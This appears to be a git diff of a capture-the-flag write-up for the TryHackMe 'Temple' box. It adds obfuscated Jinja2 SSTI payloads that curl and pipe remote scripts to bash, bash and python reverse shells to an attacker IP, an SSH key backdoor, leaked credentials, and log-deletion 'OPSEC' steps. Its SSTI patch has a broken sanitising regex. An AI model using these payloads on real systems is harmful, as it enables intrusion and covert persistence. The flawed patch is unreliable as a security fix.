@@ -4,7 +4,7 @@ Name: Temple
 Date:  13/01/2023
 Difficulty:  Hard
 Goals:  
-- Web Filter Bypass Research
+- Filter Bypass Research
 - Flask Research
 - Patch an SSTI 
 - Test Naabu 
@@ -70,6 +70,7 @@ feroxbuster
 -f 
 --rate-limit # default is zero so it will potential dos a server by default.
 -g # collecting words sounds awesome 
+-l # lowercase
 ```
 
 I need to go back to content discovery hellscape box that is [[Bart-Writeup]] and try with a update brain, methodology and less stressed. 
@@ -224,8 +225,6 @@ I tried using the [Flask API](https://flask.palletsprojects.com/en/2.2.x/api/) a
 [Progess into the internal server error](https://www.youtube.com/watch?v=-NhqAaRfxEU&list=PLi4eaGO3umboaOqaot7Oi7WszkSWRc4Pi&index=12) , I decided that after the eternal internal server errors of doom hour or so of days gone by I checked three writeups
 
 
-
-
 Although [toxicat0r's](https://tryhackme.com/p/toxicat0r) the box creater [writeup](https://wiki.thehacker.nz/docs/thm-writeups/temple-hard/) does not contain enumeration (other than `{1*2}`)for the SSTI class and subclass numbers: 
 ```python
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl {ip}/rce | bash")|attr("read")()}}
@@ -253,25 +252,172 @@ Instead of guning for the the indexes of the classes to reference them like with
 
 ![](scarecrowgotbill.png)
 
+
+Scarecrows method of getting a shell that did not work because he uses the & character which is filtered as mention Scarecrow did not perform the bad character enumeration that Al did. Regardless, we have RCE on the box we can use binaries to reach our host server hosting a reverse shell and execute it. I want improve so I will host a python reverse shell and an empire stager to practice some C2ing and two is one and one is none.
+
+```python
+#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1'
+```
+A Empire Stager and Scarecrow varient
+```bash
+export RHOST="10.11.3.193";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+
+Then we RCE a way on for the reverse shell
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cd /tmp \x26\x26 curl http://10.11.3.193/shell.sh | bash")|attr("read")()}}
+```
+- The above failed.
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cd /tmp \x26\x26 curl http://10.11.3.193/stager.sh | bash")|attr("read")()}}
+```
+
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cd /tmp \x26\x26 curl http://10.11.3.193/shell.py | bash")|attr("read")()}}
+```
+The above succeed
+
+![](billlonthebox.png)
+
+First question is why. None of the files made it to the server. All used bash pipe, potentially it is the shebang line getting handled strangely. I tried then with:
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cd /tmp \x26\x26 curl http://10.11.3.193/shell-noshebang.sh | bash")|attr("read")()}}
+```
+and 
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cd /tmp \x26\x26 curl http://10.11.3.193/shell-noshebang.sh | bash")|attr("read")()}}
+```
+Before I did this I realised that it may be that I can only login from one IP as it called back for shell.py.
+![](oneiponeaccount.png)
+
+And then!
+![](empireshellyes.png)
+
+Lessons learnt:
+- I need to sharpen my Empire usage and consider general scripted setup just for OSCP and other Exams.
+- Always try multiple shell methods and keep trying
+- I can do stuff
+- Plus side of failing on re-trying and failing to log off as the Empire shell was O got a second agent
+
 ## Foothold
+
+Although it was taking a long time for the Empire task to complete.
+![](nicepassword.png)
+
+```
+app.secret_key = b"f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry"
+temple_user : 4$pCM!&bEEs$SR8H
+```
+My sql database plundering
+![](atadsad.png)
+`96e48e470254b5d7f8a2920a786e7652716f4f9c661fb029258b00ea`
+
+Bill is a member of these groups
+adm - 
+dip - Dial-up IP - allows `ppp`, `dip`, `wvdial` [Source](https://wiki.debian.org/SystemGroups)
+
+Al talks OPSEC more and added a ssh shell to the list of shell
+```bash
+ssh-keygen
+cat bill_rsa.pub
+# Bills home
+mkdir .ssh
+echo "$KEY" > .ssh/authorized_keys 
+```
+New ssh shell
+![](billnewssh.png)
 
 ## PrivEsc
 
+
+Having not done the ELK rooms on [THM I did not know what Logstash](https://tryhackme.com/room/investigatingwithelk101, I did find it on pspsy.
+![](logstash.png)
+
+`adm` group can reads these logs; [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash) *"Logstash is used for collecting, transforming and outputting logs. This is realized by using **pipelines**, which contain input, filter and output modules. The service gets interesting when having compromised a machine which is running Logstash as a service."*
+
+Apparently the Logstash as a java application was vulnerable to Log4j
+![](weewootheELKwasvulnerabletolog4j.png)
+
+Logstash is running as root!
+![](allthethingsfromhacktricksaretrue.png)
+We do not have write access to `/etc/logstash/conf.d/`, but the sample in it:
+
+![](wedohavewriteaccesstothesample.png)
+
+I wento for the lower interval and a shell
+![](sample.png)
+
+And root
+![](root.png)
+
+
 ## Beyond Root
 
+#### Patchin SSTI
 Patch the SSTI vulnerability for the newacc 
 [Patch explained here](https://tryhackme.com/room/learnssti)
 
+```python
+# webapp.py
+def check_hacking_attempt(value):
+		# Original 
+        # bad_chars = "'_#&;"
+        bad_chars = {"\"", "'", "_", "#", "&", ";", "{", "}", "(", ")", "[", "]", "<", ">", "\x"}
+        error = ""
+
+        if any(ch in bad_chars for ch in value):
+                error = "Hacking attempt detected! "
+                error += "You have been logged as "
+                error += request.remote_addr
+                return True, error
+
+        else:
+                return False, error
+```
+
+And Santization for the SSTI RCE
+```python
+# Original in webapp.py - it is not actually a template
+<p>Logged in as """ + username + """</p>
+# Better
+import re
+
+username = re.sub("^[A-Za-z0-9]", "", username)
+account_username_displayed = f"<p>Logged in as {{ username }} </p>"
+return render_template_string(template, username=username)
+```
+
+
+#### Wordlistery
+
 Make a wordlists creator in golang for the serious string compute.
 
-OneSeclistDirectoryBustingWordlistToRuleThemAll 
+OneSeclistDirectoryBustingWordlistToRuleTheCTFs
+
 
 GSSF - GoSmokeSomeFilters.go - convert strings to filter evading strings. 
-
-
+```go
 cmds:
 hex -b Bad Characters
 url encode
 requote -b "\"" 
 unicode crazy word to describe using weird characters 
 escape - escape 
+```
+
+
+#### OPSEC - Remove the MySQL entries
+
+```sql
+DELETE FROM users WHERE `user_id` > 1; 
+```
+Al had the same idea 
+![](opsecimproved.png)
+But for a more robust OPSEC clean up
+
+```sql
+DELETE FROM users WHERE `user_id` == 2;
+```
+
+
